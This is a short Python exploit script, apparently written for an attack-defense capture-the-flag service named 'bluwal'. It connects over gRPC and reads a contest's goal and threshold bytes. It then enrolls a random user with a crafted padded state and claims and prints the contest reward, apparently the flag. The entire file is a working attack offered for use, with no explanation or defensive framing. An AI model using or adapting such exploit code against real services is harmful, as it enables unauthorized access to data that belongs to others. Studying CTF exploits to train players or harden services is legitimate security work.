#!/usr/bin/env python3

import sys
import uuid

from bluwal_lib import SploitMachine
from proto.bluwal.bluwal_pb2 import EnrollmentFilter


def attack(host: str, contest_id: str):
    sm = SploitMachine(host)
    _, stub = sm.connect()

    contest = sm.get_contest(stub, contest_id)
    goal = list(contest.goal)

    assert len(goal) < 128, "checker should not create such a contest"

    varint_first_byte = goal[0] & 0x7F
    if goal[0] & 0x80:
        varint_first_byte |= 0x80

    assert varint_first_byte < 208, "checker should not create such a contest"

    user_id = str(uuid.uuid4())
    initial = list(contest.threshold) + [0] * (128 - len(contest.threshold))
    enrollment_filter = sm.enroll(
        stub,
        EnrollmentFilter(user_id=user_id, contest_id=contest_id, current_state=initial),
    )

    reward = sm.claim_reward(stub, enrollment_filter)
    print(reward)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <contest_id>")
        exit(1)

    attack(sys.argv[1], sys.argv[2])
